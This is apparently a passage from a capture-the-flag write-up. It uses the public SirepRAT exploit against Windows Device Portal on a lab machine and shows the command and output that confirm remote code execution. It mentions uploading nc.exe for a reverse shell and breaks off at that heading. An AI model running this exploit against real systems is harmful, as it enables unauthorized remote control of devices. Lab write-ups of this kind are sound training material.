## Exploit for port 29820
- While enumerating we found that it is running Windows Device Portal
- There is an exploit for RCE as System on Windows IOT core.
- https://github.com/SafeBreach-Labs/SirepRAT : Link to exploit. The examples explain the usage.

### Checking Remote Code Execution

- To check if the exploit works
```bash
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\hostname.exe"
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 6, payload peek: 'b'omni\r\n''>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: 'b'\x00\x00\x00\x00''>
```
- `omni` in the output tells us that remote code execution is possible.
- We can use this to upload `nc.exe` and get a reverse shell.


### Uploading the Reverse Shell

